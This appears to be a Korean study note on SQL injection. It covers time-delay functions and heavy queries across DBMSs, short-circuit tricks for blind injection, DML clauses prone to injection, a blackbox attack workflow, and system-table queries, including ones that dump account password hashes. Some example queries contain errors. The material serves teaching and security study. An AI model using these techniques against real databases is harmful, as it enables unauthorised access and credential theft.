            | ```BENCHMARK(count, expr)``` | 반복 수행할 횟수(count)와 실행할 표현식(expr)을 인자로 필요로 하며, 표현식을 반복횟수만큼 실행하며 시간 지연을 발생시킴 <br/> &nbsp;&nbsp; - 표현식은 반드시 스칼라(단일) 값을 반환해야 함 <br/> &nbsp;&nbsp; - **지정한 횟수만큼 반복실행하는데 얼마나 시간이 소요되었는지**가 중요함 <br/> &nbsp;&nbsp; - 📌 해당 함수로 얻은 쿼리나 함수의 성능은 그 자체로는 별 의미가 없음에 유의 <br/> &nbsp;&nbsp;&nbsp;&nbsp; (2개의 기능을 상대적으로 비교﹒분석하는 용도로만 사용할 것을 권장함) |
            - 함수 사용 예시
                ```sql
                SELECT SLEEP(1); # 결과: 1 row in set(1.00 sec)

                SELECT BENCHMARK(4000000, SHA(1)); # 결과: 1 row in set (10.78 sec)
                ```
        + 헤비 쿼리를 이용하는 방법
            - 많은 수의 데이터가 포함된 테이블을 연산 과정에 포함시켜 시간을 지연시킴
                + **```information_schema.tables``` 테이블**을 이용하는 방법이 대표적임 <br/> &nbsp;&nbsp;&nbsp;&nbsp; ↳ MySQL에서 기본적으로 제공하는 시스템 테이블 → 기본적으로 **많은 수의 데이터가 포함되어 있음**
                + 충분한 시간 지연이 발생하기에 데이터가 적은 경우에는 테이블을 여러번 추가하면 됨
            - 헤비 쿼리 예시
                ```sql
                SELECT (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
                # 결과: 1 row in set (1.38 sec)
                ```
    - MSSQL
        + MSSQL에서 제공하는 함수를 이용하는 방법
            | 사용 함수 | 설명 |
            |:---:|------|
            | ```WAITFOR``` | ```WAITFOR DELAY 'time_to_pass'``` 형식 → 특정 시간 동안 지연시킬 때 사용됨 <br/> &nbsp;&nbsp; - ```'time_to_pass'``` 부분에 **'시:분:초:밀리세컨드' 형식**으로 딜레이를 줄 수 있음 |
            - 함수 사용 예시
                ```sql
                SELECT '' IF((SELECT 'abc')='abc') WAITFOR DELAY '0:0:1';
                /* 쿼리 실행 결과
                Execution time: 1.02 sec, rows selected: 0, rows affected: 0, absolute service time: 1.17 sec, absolute service time: 1.16 sec
                */
                ```
        + 헤비 쿼리를 이용하는 방법
            - ```information_schema.columns``` 테이블과 같이 많은 수의 데이터가 포함된 테이블을 연산 과정에 포함시켜 시간을 지연시킴
                + 충분한 시간 지연이 발생하기에 데이터가 적은 경우에는 테이블을 여러 번 추가하면 됨
            - 헤비 쿼리 예시
                ```sql
                SELECT (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D, information_schema.columns E, information_schema.columns F);
                /* 쿼리 실행 결과
                Execution times: 6.36 sec, rows selected: 1, rows affected: 0, absolute service time: 6.53 sec, absolute service time: 6.53 sec
                */
                ```
    - SQLite
        + 헤비 쿼리를 이용하는 방법
            - ```RANDOMBLOB```에 의해 많은 수의 데이터가 생성되며, 변환 과정과 함수를 거치면 시간 지연이 발생한다는 점 등을 공격에 활용할 수 있음
            - 헤비 쿼리 예시
                ```sql
                .timer ON
                SELECT LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(150000000000000/2)))) # SLEEP TIME: 150000000000000/2
                /* 쿼리 실행 결과
                Run Time: real 9.740 user 7.983349 sys 1.743972
                */
                ```

<br/><br/>

### Short-circuit Evaluation
* Logic 연산의 원리를 이용한 Error/Time based SQL Injection
    - ```AND``` 연산자를 이용한 공격
        + 앞의 식의 결과에 따라 뒤의 식의 결과가 달라진다는 점을 이용함 <br/> &nbsp;&nbsp; *→ 앞의 식이 거짓이라면 뒤의 식은 연산을 하지 않더라도 결과 거짓이라는 것을 알 수 있음 **= 실제로 뒤의 식을 수행하지 않는 것을 의미함***
        + 공격 예시: Short-circuit evaluation - Time based SQLI
            ```sql
            # 앞의 식이 거짓(0)을 반환하기 때문에 SLEEP 함수가 실행되지 않음
            SELECT 0 AND SLEEP(10); # 결과: 1 row in set (0.00 sec)

            # 앞의 식이 참(1)을 반환하기 때문에 SLEEP 함수가 실행됨
            SELECT 1 AND SLEEP(10); # 결괴: 1 row in set (10.04 sec)
            ```
    - ```OR``` 연산자를 이용한 공격
        + 앞의 식이 참이라면 뒤의 식의 결과가 출력에 영향을 주지 않는다는 점을 이용함 <br/> &nbsp;&nbsp; *→ 앞의 식이 참이라면 뒤의 식의 결과는 실행에 영향을 주지 않음 **= 실제로 뒤의 식은 수행되지 않는 것을 의미함***
        + 공격 예시: Short-circuit evaluation - Error based Blind SQLI
            ```sql
            # 앞의 식이 참이로 뒤의 식이 DOUBLE 자료형의 최댓값을 초과함에도 불구하고 정상적인 결과를 출력함 (에러 메시지 출력 X)
            SELECT 1=1 OR 9e307*2; # 결과: 1

            # 앞의 식이 거짓이고, 뒤의 식이 DOUBLE 자료형의 최댓값을 초과하므로 에러 메시지를 출력함
            SELECT 1=0 OR 9e307*2; # 결과: ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'
            ```

<br/><br/><br/>

## SQL DML 구문에 대한 이해
* **SQL DML**(Data Manipulation Langauge, 데이터 조작어)
    - 데이터베이스의 테이블에서 **데이터를 조회**하거나, **추가/삭제/수정을 수행**하는 구문
    - 일반적인 이용자가 입력하는 데이터는 **대부분 DML를 통해 처리**하게 됨 <br/> &nbsp;&nbsp; *→ ⚠️ 각 쿼리가 사용되어지는 목적과 형태를 이해하게 되면 SQL Injection 공격을 더 잘 이해할 수 있음*

<br/><br/>

### SELECT: 데이터를 조회하는 구문
* MySQL 8.0 Reference Manual의 ```SELECT Statement``` [🔗](https://dev.mysql.com/doc/refman/8.0/en/select.html)
    ```sql
    SELECT
        [ALL | DISTINCT | DISTINCTROW ]
        select_expr [, select_expr]
        [FROM table_references
        [PARTITION partition_list]]
        [WHERE where_condition]
        [GROUP BY {col_name | expr | position}, ... [WITH ROLLUP]]
        [HAVING where_condition]
        [WINDOW window_name AS (window_spec)
            [, window_name AS (window_spec)] ...]
        [ORDER BY {col_name | expr | position}
        [ASC | DESC], ... [WITH ROLLUP]]
        [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    ```
    - 데이터를 검색하는 기본 문장 → **질의어**(query)라고 부름
    - SELECT 구문의 간단한 형식: ```SELECT 열1[, 얄2, ...] FROM 테이블 이름 [WHERE <검색조건>] [GROUP BY 속성이름] [ORDER BY 속성이름 [ASC | DESC]];```
        | 절 | 설명 |
        |:---:|------|
        | SELECT | 해당 문자열을 시작으로, 조회하기 위한 표현식과 컬럼들에 대해 정의함 <br/> &nbsp;&nbsp; - 열의 순서는 결과 테이블의 열 순서를 결정하며, 기본적으로 중복을 제거하지 않음 <br/> &nbsp;&nbsp; - ```SELECT *```은 테이블의 모든 열을 조회한다는 의미 |
        | FROM | 데이터를 조회할 테이블의 이름 |
        | WHERE | 조회할 데이터의 조건 <br/> &nbsp;&nbsp; - 조건으로 사용할 수 있는 **술어**(predicate)가 존재하며, 복합조건 사용 시 **논리 연산자 ```AND```, ```OR```, ```NOT```**을 사용함 |
        | ORDER BY | 조회한 결과를 원하는 컬럼 기준으로 정렬함 <br/> &nbsp;&nbsp; - 정렬을 원하는 열 이름을 순서대로 지정하며, 기본은 오름차순(ASC) 정렬임 |
        | LIMIT | 조회한 결과에서 행의 갯수와 오프셋을 지정함 |
        + WHERE절에서 조건으로 사용할 수 있는 술어(predicate)
            | 술어 | 설명 |
            |:---:|------|
            | 비교 | ```=```, ```<>```, ```<```, ```<=```, ```>```, ```>=``` 등을 사용함 |
            | 범위 | ```BETWEEN``` 연산자를 사용하면 값의 범위를 지정할 수 있음 (논리 연산자 ```AND```을 함께 사용함) <br/> &nbsp;&nbsp; - ex: 가격이 10000 이상 20000 이하인 경우 → ```WHERE price BETWEEN 10000 AND 20000``` |
            | 집합 | 두 개 이상의 값을 비교하기 위해 ```IN```, ```NOT IN``` 연산자를 이용함 |
            | 패텬 | 문자열의 패턴 비교를 위해 ```LIKE``` 연산자와 와일드카드 문자를 사용함 |
            | NULL |
            | 복합조건 | 논리 연산자 ```AND```, ```OR```, ```NOT```을 사용하면 복합 조건을 명시할 수 있음 |
    - ⚠️ SELECT 구문에서 이용자의 입력 데이터가 주로 사용되는 ```WHERE```, ```ORDER BY```, ```LIMIT``` 절에서 SQL Injection이 발생할 수 있음

<br/>

* SELECT 구문 사용 예시
    ```sql
    SELECT uid, title, boardcontent # uid, title, boardcontent 열을 조회 (결과 테이블의 열 순서도 이와 동일함)
    FROM boards # board 테이블에서
    WHERE boardcontent LIKE '%abc%' # 조건(패턴 비교): abc를 포함하는 문자열
    ORDER BY uid DESC # 정렬: uid를 기준으로 내림차순(DESC) 정렬
    LIMIT 5; # 결과 테이블의 행의 수: 5
    ```

<br/><br/>

### INSERT: 데이터를 추가하는 구문
* MySQL 8.0 Reference Manual의 ```INSERT Statement``` [🔗](https://dev.mysql.com/doc/refman/8.0/en/insert.html)
    ```SQL
    INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE]
        [INTO] tbl_name
        [PARTITION (partition_name [, partition_name] ...)]
        [(col_name [, col_name] ...)]
        { {VALUES | VALUE} (value_list) [, (value_list)] ... }
        [AS row_alias[(col_alias [, col_alias] ...)]]
        [ON DUPLICATE KEY UPDATE assignment_list]
    ```
    - INSERT 구문의 간단한 형식: ```INSERT INTO 테이블이름 [(속성리스트)] VALUES (값 리스트);```
        | 절 | 설명 |
        |:---:|------|
        | INSERT | 해당 문자열을 시작으로, 추가할 테이블과 데이터를 정의함 |
        | INTO | 데이터를 추가할 테이블의 이름과 컬럼을 정의함 (새로운 행을 삽입할 때에는 속성의 이름을 생략할 수 있음) <br/> &nbsp;&nbsp; ***→ 데이터의 입력 순서는 속성의 순서와 일치해야 함*** |
        | VALUES | INTO 절에서 정의한 테이블의 컬럼에 추가할 데이터의 값을 명시함 |
    - ⚠️ INSERT 구문에서는 추가할 데이터의 값들이 입력되는 ```VALUE[S]``` 절에서 주로 SQL Injection이 발생함

<br/>

* INSERT 구문 사용 예시
    ```sql
    # 예시 1: 쿼리 한 줄로 두 개 이상의 데이터를 추가함 → ,를 이용해 여러 데이터를 한 번에 추가하고 있음
    INSERT
        INTO boards (title, boardcontent)
        VALUES ('title 1', 'content 1'), ('title 2', 'content 2'); # board 테이블의 title, boardcontent 열에 소괄호 안의 값을 순서대로 추가함
    
    # 예시 2: 서브 쿼리를 통해 다른 테이블에 존재하는 데이터를 추가함
    INSERT
        INTO boards (title, boardcontent)
        VALUES ('title 1', (SELECT upw FROM users WHERE uid='admin'));
    ```

<br/><br/>

### UPDATE: 데이터를 수정하는 구문
* MySQL 8.0 Reference Manual의 ```UPDATE Statement``` [🔗](https://dev.mysql.com/doc/refman/8.0/en/update.html)
    ```sql
    UPDATE [LOW_PRIORITY] [IGNORE] table_reference
        SET assignment_list
        [WHERE where_condition]
        [ORDER BY ...]
        [LIMIT row_count]
    ```
    - UPDATE 구문의 간단한 형식: ```UPDATE 테이블이름 SET 속성이름1=값1[, 속성이름2=값2, ...] [WHERE <검색조건>];```
        | 절 | 설명 |
        |:---:|------|
        | UPDATE | 해당 문자열을 시작으로, 수정할 테이블을 정의함 |
        | SET | 수정할 컬럼과 데이터를 정의함 <br/> &nbsp;&nbsp; - 데이터는 SELECT문을 사용하여 다른 테이블의 속성 값을 이용할 수 있음 |
        | WHERE | 수정할 행의 조건을 명시함 |
    - ⚠️ UPDATE 구문에서는 이용자의 입력 데이터가 주로 사용되는 ```SET``` 절과 ```WHERE``` 절에서 SQL Injection이 발생할 확률이 높음

<br/>

* UPDATE 구문 사용 예시
    ```sql
    UPDATE boards # boards 테이블에서 수정할 것이라고 명시함
        SET boardcontent = "update content 2" # (수정할 컬럼) = (수정할 데이터) 형식으로 SET 절 명시
        WHERE title = 'title 1'; # 조건: title 행의 값이 'title 1'인 경우
    ```

<br/><br/>

### DELETE: 데이터를 삭제하는 구문
* MySQL 8.0 Reference Manual의 ```DELETE Statement``` [🔗](https://dev.mysql.com/doc/refman/8.0/en/delete.html)
    ```sql
    DELETE [LOW_PRIORITY] [QUICK] [IGNORE] FROM tbl_name [[AS] tbl_alias]
        [PARTITION (partition_name [, partition_name] ...)]
        [WHERE where_condition]
        [ORDER BY ...]
        [LIMIT row_count]
    ```
    - DELETE 구문의 간단한 형식: ```DELETE FROM 테이블이름 [WHERE <검색조건>];```
        | 절 | 설명 |
        |:---:|------|
        | DELETE | 해당 문자열을 시작으로, 이후에 삭제할 테이블을 정의함 |
        | FROM | 삭제할 테이블을 정의함 |
        | WHERE | (optional) 삭제할 행의 조건을 명시함 → 없으면 모든 행을 삭제함 |
    - ⚠️ DELETE 구문에서는 이용자의 입력 데이터가 주로 사용되는 ```WHERE``` 절에서 SQL Injection이 발생할 확률이 높음

<br/>

* DELETE 구문 사용 예시
    ```sql
    DELETE FROM boards # boards 테이블에서 행을 삭제함
        WHERE title = 'title 1'; # 조건: title의 값이 'title 1'인 경우
    ```

<br/><br/><br/>

## Exploit Techique
* SQL Injection의 특징과 목적
    - 📌 공격의 2가지 대표적인 목적 - **정보 탈취**(기밀성 침해), **정보 수정 및 삭제**(무결성 침해)
        + 두 가지 사항 모두 **SQL Injection을 통해 기존에 권한이 없는 정보에 접근하는 것**이 공통됨
    - SQL Injection 취약점의 특징
        + 일반적으로 임의의 SQL 구문을 실행할 수 있도록 함
        + 입력 형식과 필터링 및 데이터베이스 엔진의 종류에 따라 가능선 구문과 공격의 영향이 제한될 수 있음 <br/> &nbsp;&nbsp; *→ 웹 서비스에 적응되어 있는 방어 기법을 이해하고 우회할 수 있는 방법을 알아보는 것이 좋음*

<br/>

* Blackbox 점검 중 SQL Injection 취약점을 발견하고 공격의 목적을 달성하기까지의 과정
    - [과정 1] **SQL Injection 취약점 발견**
        + SQL Injection의 발생 여부를 판단하는 방법에는 여러가지가 존재함
        + 대표적인 취약점 확인 방법
            - HTTP Response Status Code를 통해 오류가 발생하는지 확인함
            - DBMS의 오류 메세지를 통행 취약점 가능성 확인함
            - 웹 어플리케이션에서 변조된 SQL 구문이 실행된 데이터가 반환되는지 확인함
    - [과정 2] **구문 예측/DBMS 정보 획득**
        + 이용자의 입력 데이터를 처리하는 구문을 예측함
            | | 예시 설명 |
            |:--:|------|
            | 예시 1 | 로그인 로직 처리 과정 → 데이터베이스에서 회원의 정보를 가져오기 위해 ```SELECT``` 구문의 ```WHERE``` 절에서 이용자의 입력 <br/> 데이터를 처리함 |
            | 예시 2 | 회원 가입 로직 → 새로운 데이터를 추가하기 위해 ```INSERT``` 구문의 ```VALUES``` 절에서 이용자의 입력 데이터를 처리함 |
        + DBMS의 정보를 획득하여 Exploit 작성을 위한 정보를 획득함
    - [과정 3] **Exploit 작성**
        + 사용할 공격 기법을 선정함
            - 데이터베이스의 결과 그대로 노출되는 경우 → ```UNION```, Subquery 구문을 통해 직접적으로 정보를 노출할 수 있는 구문을 사용함
            - 정보가 노출되지 않는 경우 → **Blind SQL Injection**을 사용함
        + WAF와 같이 SQL Injection을 방어하는 로직 등이 존재할 경우 우회 가능성을 판단함
    - [과정 4] **정보 탈취 및 수정/삭제**
        + 시스템 테이블 등을 이용하여 데이터베이스의 정보 등을 획득함
        + 저장된 데이터를 탈취하거나 수정/삭제하여 공격의 목적을 달성함

<br/><br/>


### Exploit Tech: System Tables
* DBMS마다 존재하는, 데이터베이스의 정보를 포괄하는 테이블
    - DB 설정 및 계정 정보 외에도 데이터베이스/테이블/컬럼 정보, 현재 실행되고 있는 쿼리 정보 등 다양한 정보들을 담고 있음
    - **데이터베이스를 구성하기 위한 필수 요소이기 때문에 삭제할 수 없음** <br/> &nbsp;&nbsp; → SQL Injection 취약점을 발견하면 DBMS별 시스템 테이블을 이용하여 공격 수행 가능
    - ⚠️ 시스템 테이블에 담긴 정보들을 통해 SQL Injection 취약점을 좀 더 효율적으로 공격할 수 있음
        + 테이블과 컬럼명 등 시스템 테이블에서 알아낸 정보를 통해 공격자는 원하는 정보, 민감한 정보를 쉽게 공격할 수 있음
        + 시스템 테이블을 활용한 공격 상황 예시
            | | 설명 |
            |:---:|------|
            | 조건 | - 게시판 서비스에서 boards 테이블을 ```SELECT``` 구문을 통해 조회할 때 SQL Injection 발생 <br/> - 공격자는 이용자 정보가 포함되어 있는 유저 테이블, 컬럼 정보 등을 모르는 상황 |
            | 공격 방법 | 시스템 테이블의 정보를 이용하여 유저 테이블의 이름 및 컬럼 정보를 획득함 <br/> → 획득한 테이블, 컬럼 정보로 유저 테이블에 접근 및 이용자 정보를 획득할 수 있음 |

<br/>

* System Tables: **MySQL** <br/> *📌 주의: MSSQL은 스키마와 데이터베이스가 동일함*
    ```sql
    -- 데이터베이스의 목록을 출력하는 명령
    SHOW databases;
    /* 출력 결과
        - 초기 설치 시 존재하는 데이터베이스: information_schema, mysql, performance_schema, sys
        - 이용자 정의 데이터베이스가 존재할 경우 해당 데이터베이스도 출력함
    */
    ```
    - **```information_schema```**: (Read-only) MySQL 서버 내에 존재하는 DB의 메타 정보(테이블, 컬럼, 인덱스 등의 스키마 정보)를 모아둔 DB
        + 실제 레코드가 있는 게 아니라 SQL을 이용해 조회할 때마다 메타 정보를 MySQL 서버의 메모리에서 가져와서 보여줌 <br/><br/>
            > 💡 **메타 데이터**(meta data)
            > * 데이터의 데이터 → 데이터베이스 또는 테이블의 이름, 컬럼의 데이터 타입, 접근 권한 같은 것을 의미함
            <br/>
        + ```information_schema```의 주요 테이블
            | 테이블 | 설명 |
            |:---:|------|
            | ```TABLES``` | 생성된 모든 테이블의 정보를 담고 있음 → 스키마, 테이블의 정보를 조회할 수 있음 |
            | ```COLUMNS``` | 모든 스키마의 컬럼 정보를 확인할 수 있음 → 컬럼의 정보를 조회할 수 있음 |
            | ```PROCESSLIST``` | 수행 중인 프로세스 리스트를 담고 있음 → 실시간으로 실행되는 쿼리를 조회할 수 있음 |
            | ```USER_PRIVILEGES``` | 사용자 권한 정보를 담고 있음 → MySQL 서버의 계정 정보를 조회할 수 있음 |
            - ```information_schema``` DB의 각 테이블 조회 예시
                ```sql
                -- 스키마 정보 조회 (information_schema 데이터베이스의 TABLES 테이블): TABLE_SCHEMA(테이블 스키마)에 해당하는 정보를 그룹화하여 조회함
                SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;

                -- 테이블 정보 조회 (information_schema 데이터베이스의 TABLES 테이블): TABLES_SCHEMA(테이블 스키마), TABLE_NAME(테이블 이름)을 조회함
                SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES;

                -- 컬럼 정보 조회 (information_schema 데이터베이스의 COLUMNS 테이블): TABLE_SCHEMA(테이블 스키마), TABLE_NAME(테이블 이름), COLUMN_NAME(컬럼 이름)을 조회함
                SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.COLUMNS;

                -- 실시간 실행 쿼리 정보 조회 (information_schema 데이터베이스의 PROCESSLIST 테이블): 모든 내용을 조회함
                SELECT * FROM information_schema.PROCESSLIST; -- → 쿼리 결과에 해당 쿼리가 포함되어 있음을 알 수 있음
                /*
                    💡 SYS 데이터베이스의 SESSION 테이블을 통해서 실행 중인 계정과 함께 조회하는 방법도 있음
                    SELECT user, current_statement FROM sys.session;
                */

                -- DBMS 계정 정보 조회 (information_schema 데이터베이스의 USER_PRIVILEGES 테이블): GRANTEE(계정 정보), PRIVILEGE_TYPE, IS_GRANTABLE(각 권한에 대한 내용들 - 허용된 쿼리문과 해당 권한을 부여할 수 있는지 여부 등)을 조회함
                SELECT GRANTEE, PRIVILEGE_TYPE, IS_GRANTABLE WHERE information_schema.USER_PRIVILEGES;
                /*
                    💡 mysql 데이터베이스의 user 테이블을 통해 DBMS의 계정 정보를 조회하는 방법도 있음
                    SELECT user, authentication_string FROM mysql.user;
                */
                ```

<br/>

* System Tables: **MSSQL**
    ```sql
    -- 데이터베이스의 목록을 출력하는 명령
    SHOW databases;
    /* 출력 결과
        - 초기 설치 시 존재하는 데이터베이스: master, tempdb, model, msdb 데이터베이스
        - 이용자 정의 데이터베이스가 존재할 경우 해당 데이터베이스도 출력함
    */
    ```
    - **```master```** 데이터베이스
        + ```master``` 데이터베이스의 **```sysdatabases``` 테이블**
            - 데이터베이스의 정보를 조회할 수 있음
            - ```mastser..sysdatabases``` 조회 예시
                ```sql
                -- master 데이터베이스의 sysdatabases 테이블에서 name(데이터베이스 이름)에 해당하는 정보를 출력함
                SELECT name FROM master..sysdatabases;
                /* 출력 결과
                    - 초기 실처 시 존재하는 데이터베이스들(master, tempdb, model, msdb)을 출력함
                    - 이용자 정의 데이터베이스가 존재할 경우 이용자 정의 데이터베이스(들)도 출력함
                */

                -- DB_NAME(num) 형식으로 데이터베이스의 정보를 알아낼 수 있음
                SELECT DB_NAME(1);
                /* 출력 결과
                    - 1번 데이터베이스가 master라면 master를 출력함
                    - 숫자 0은 현재 데이터베이스를 의미함
                */
                ```
        + ```master``` 데이터베이스의 **```sys.sql_logins``` 테이블**
            - MSSQL 서버의 계정 정보를 조회할 수 있음
                + ```master``` 데이터베이스의 ```syslogins``` 테이블을 통해서도 조회할 수 있음
            - ```master.sys.sql_logins``` 조회 예시
                ```sql
                -- master 데이터베이스의 sys.sql_logins 테이블을 통해 user(계정 이름)과 password_hash(비밀번호의 해시 정보)를 조회함
                SELECT name, password_hash FROM master.sys.sql_logins;

                -- master 데이터베이스의 syslogins 테이블을 통해 유사한 결과를 얻을 수 있음
                SELECT * FROM master..syslogins;
                ```
    - 이용자 정의 데이터베이스의 **```sysobjects``` 테이블**
        + 이용자 정의 데이터베이스의 테이블 정보를 조회할 수 있음
            - 이용자 정의 데이터베이스의 ```information_schema``` 스키마의 ```tables``` 테이블을 통해서도 조회할 수 있음
        + ```sysobjects``` 조회 예시
            ```sql
            -- 이용자 정의 데이터베이스(users)의 sysobjects 테이블을 조회하여 데이터베이스의 name(테이블 이름)을 조회함
            SELECT name FROM users..sysobjects WHERE xtype='U'; -- xtype='U'는 이용자 정의 테이블을 의미함

            -- information_schema 스키마의 tables 테이블을 통해 동일한 결과를 얻을 수 있음
            SELECT table_name FROM users.information_schema.tables;
            ```
    - 이용자 정의 데이터베이스의 **```syscolumns```** 테이블
        + 이용자 정의 데이터베이스의 컬럼 정보를 조회할 수 있음
            - 이용자 정의 데이터베이스의 ```information_schema``` 스키마의 ```columns``` 테이블을 통해서도 조회할 수 있음
        + ```syscolumns``` 조회 예시
            ```sql
            -- syscolumns 테이블에서 서브쿼리의 결과에 해당하는 id의 name(컬럼명)을 조회함
            SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects FROM name='users');

            -- information_schema 스키마의 columns 테이블을 통해 유사한 결과를 얻을 수 있음
            SELECT table_name, column_name FROM users.information_schema.columns;
            ```

<br/>

* System Tables: **PostgreSQL** <br/> *📌 주의: PostgreSQL은 스키마와 데이터베이스가 다름*
    - **```pg_database```**: 생성된 데이터베이스의 목록을 확인할 수 있음
        + 데이터베이스의 이름, 소유자, 정렬 순서 등의 데이터베이스 정보를 관리함
        + ```pd_database``` 조회 예시
            ```sql
            -- pg.database의 datname(데이터베이스 이름)을 조회
            SELECT datname FROM pg_database;
            /* 출력 결과 (초기 설치 시 아래와 같은 3개의 데이터베이스가 존재함)
                 datname
                 ----------
                 postgres
                 template1
                 template2
                (3 rows)
            */
            ```
    - **```pg_catalog```**: 주요 정보를 담고 있는 테이블을 포함한 스키마(시스템 카탈로그)
        + ```information_schema```로도 비슷한 정보를 조회할 수 있음
        + ```pg_catalog``` 조회 예시
            ```sql
            -- pg_catalog 스키마의 pg_namespace(스키마 정보) 테이블에서 nspname(네임스페이스의 이름)을 조회함
            SELECT nspname FROM pg_catalog.pg_namespace;
            /* 출력 결과
                 nspname
                 ----------
                 pg_toast
                 pg_temp_1
                 pg_toast_temp_1
                 pg_catalog
                 public
                 information_schema
                (6 rows)
            */
            ```
        + ```pg_catalog``` 스키마의 각 테이블을 이용해 조회할 수 있는 정보들
            | 테이블 | 조회할 수 있는 정보 |
            |----|------|
            | ```pg_catalog.pg_shadow``` 테이블 | PostgreSQL 서버의 계정 정보를 조회할 수 있음 |
            | ```pg_catalog.pg_settings``` 테이블 | PostgreSQL 서버의 설정 정보를 조회할 수 있음 |
            | ```pg_catalog.pg_database``` 테이블 | PostgreSQL 서버의 데이터베이스 정보를 조회할 수 있음 |
            | ```pg_catalog.stat_activity``` 테이블 | 실시간으로 실행되는 쿼리를 조회할 수 있음 |
            - ```pg_catalog``` 스키마의 각 테이블 조회 예시
                ```sql
                -- DBMS 계정 정보 조회(pg_catalog 스키마의 pg_shadow 테이블): username(계정 이름), passwd(비밀번호의 해시 정보)를 조회함
                SELECT username, passwd FROM pg_catalog.pg_shadow;

                -- DBMS 설정 정보 조회(pg_catalog 스키마의 pg_settings 테이블): name(서버 이름), setting(설정 정보)를 조회함
                SELECT name, setting FROM pg_catalog.pg_settings;

                -- 데이터베이스 정보 조회(pg_catalog 스키마의 pg_database 테이블): datname(데이터베이스 이름)을 조회함
                SELECT datname FROM pg_catalog.pg_database; -- 위의 pg_database 테이블 조회와 동일함

                -- 실시간 실행 쿼리 확인(pg_catalog 스키마의 stat_activity 테이블): username(쿼리를 실행시킨 계정 이름), query(실행한 쿼리)를 조회함
                SELECT username, query FROM pg_catalog.stat_activity;
                ```
    - **```information_schema```**: 데이터베이스의 모든 메타 정보를 가지고 있는 스키마
        + 각 테이블의 정보를 조회하는데 사용할 수 있음
        + ```information_schema``` 조회 예시
            ```sql
            -- information_schema 스키마의 tables 테이블에서 스키마가 pg_catalog인 항목의 table_name(테이블 이름)을 조회함
            SELECT table_name FROM information_schema.tables WHERE table_schema='pg_catalog';
            /* 출력 결과
                 table_name
                 ----------
                 pg_shadow
                 pg_settings
                 pg_databases
                 ...
            */
            
            -- information_schema 스키마의 tables 테이블에서 스키마가 information_schema인 항목의 table_name(테이블 이름)을 조회함
            SELECT table_name FROM information_schema.tables WHERE table_schema='information_schema';
            /* 출력 결과
                 table_name
                 ----------
                 schemata
                 tables
                 columns
                 ...
            */
            ```
        + ```information_schema``` 스키마의 각 테이블을 이용해 조회할 수 있는 정보들
            | 테이블 | 조회할 수 있는 정보 |
            |----|------|
            | ```information_schema.tables``` 테이블 | 데이터베이스의 스키마 및 테이블 정보 등을 조회할 수 있음 |
            | ```information_schema.colunns``` 테이블 | 컬럼 정보를 조회할 수 있음 |
            - ```information_schema``` 스키마의 각 테이블 조회 예시
                ```sql
                -- 테이블 정보 조회(information_schema 스키마의 tables 테이블): table_schema(테이블의 스키마), table_name(테이블 이름)을 조회함
                SELECT table_schema, table_name FROM information_schema.tables;

                -- 컬럼 정보 조회(information_schema 스키마의 columns 테이블): table_schema(테이블의 스키마), table_name(테이블 이름), column_name(컬럼 이름)을 조회함
                SELECT table_schema, table_name, column_name FROM information_schema.columns;
                ```

<br/>

* System Tables: **Oracle**
    - **```all_tables```**: 데이터베이스의 정보를 확인할 수 있는 테이블
        + 현재 사용자가 접근할 수 있는 테이블의 집합 = 로그인된 계정의 권한으로 접근할 수 있는 모든 테이블들
        + ```all_tables``` 테이블 조회 예시
            ```sql
            -- all_tables의 owner(테이블을 소유한 사용자)를 조회
            SELECT DISTINCT owner FROM all_tables; -- DISTINCT(중복 제거) 키워드로 중복된 데이터를 제거함

            -- all_tables의 owner(테이블을 소유한 사용자)와 table_name(테이블 이름)을 조회
            SELECT owner, table_name FROM all_tables;
            ```
    - **```all_tab_columns```**: 특정 테이블의 컬럼 정보를 확인할 수 있는 테이블
        + 현재 로그인된 계정의 권한으로 접근할 수 있는 모든 테이블 내의 컬럽의 집합
        + ```WHERE``` 구문으로 ```table_name```에 조회하고 싶은 테이블을 조건으로 입력하면 해당 테이블의 컬럼 이름을 조회할 수 있음
        + ```all_table_columns``` 테이블 조회 예시
            ```sql
            -- all_tab_columns 테이블에서 table_name이 users인 테이블의 column_name(컬럼 이름)을 조회
            SELECT column_name FROM all_tab_columns WHERE table_name = 'users';
            ```
    - **```all_users```**: DBMS의 계쩡 정보를 확인할 수 있는 테이블
        + 모든 유저의 정보를 조회할 수 있음
        + ```all_users``` 테이블 조회 예시
            ```sql
            -- all_users 테이블의 모든 열을 조회하여 DBMS에 생성된 모든 유저를 조회함
            SELECT * FROM all_users;
            -- SELECT * FROM DBA_USERS;를 이용해도 동일한 결과가 출력됨
            ```

<br/>

* System Table: **SQLite**
    - **```sqlite_master``` 시스템 테이블**
        + 생성되어 있는 테이블 등의 정보와 sql를 획득할 수 있음
        + ```sqlite_master``` 테이블 조회 예시
            ```sql
            .header on -- 콘솔에서 실행 시 컬럼 헤더를 출력하기 위해 설정함

            -- sqlite_master 테이블의 전체 데이터를 조회함
            SELECT * FROM sqlite_master;
            /* 결과
            type | name | tbl_name | rootpage | sql
            table | users |users | 2 | CREATE TABLE users (uid text), upw text)
            */
            ```
            - ```uid```(text), ```upw```(text)를 열로 가지고 있는 users 테이블과 테이블 생성 시 사용한 SQL 문을 획득함


<br/><br/>

### Exploit Tech: DBMS Fingerprinting
* SQL Injection 취약점이 발생할 때 데이터베이스의 테이블과 컬럼 등 데이터베이스가 저장하고 있는 중요한 정보를 수집하는 방법
    - **핑거프린팅**(Fingerprinting): 공격 대상의 정보를 수집하는 과정
        + 공격 대상이 사용하는 웹 서버와 개발 언어, 그리고 DBMS의 내부 정보 등을 알아내는 과정이 이에 해당됨
        + Penetration Testing Execution Standard(PTES)에서 정의한 모의 해킹의 7단계 중 **공격 대상을 정하고 대상의 정보를 수집하는 1단계**에 해당
    - ⚠️ Blackbox 점검에서 SQL Injection이 의심되는 Endpoint를 찾았을 때 DBMS의 종류를 파악한 후 공격하는 것이 효율적임

<br/>

